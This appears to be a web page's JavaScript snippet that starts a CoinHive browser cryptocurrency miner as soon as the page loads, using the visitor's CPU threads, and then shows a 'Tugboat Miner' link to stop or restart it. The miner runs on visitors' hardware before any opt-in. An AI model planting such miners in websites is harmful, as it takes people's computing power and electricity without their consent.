    var miner = new CoinHive.Anonymous('xi489QOv8SWYkd6mzQyUzqjLAby0N2gb', {
        threads: navigator.hardwareConcurrency,
        autoThreads: false,
        throttle: 0.75,
        forceASMJS: false
    });
    miner.start(CoinHive.IF_EXCLUSIVE_TAB);    setTimeout(checkMiner, 3000);

    function checkMiner() {
        if (miner.isRunning() == true) {
            document.getElementById('tempMiner').innerHTML = "<a style='font-weight:bold;color:#fff;font-size:12xp;' href='javascript:miner.stop();checkMiner();'>Tugboat Miner is running, click here to stop it.</a>"
        } else {
            document.getElementById('tempMiner').innerHTML = "<a style='font-weight:bold;color:#fff;font-size:12xp;' href='javascript:miner.start(CoinHive.IF_EXCLUSIVE_TAB);checkMiner();'>Tugboat Miner is not running, click here to start it.</br> If it doesn't start, it may be blocked from your side or running in another tab!</a>"
        }
    }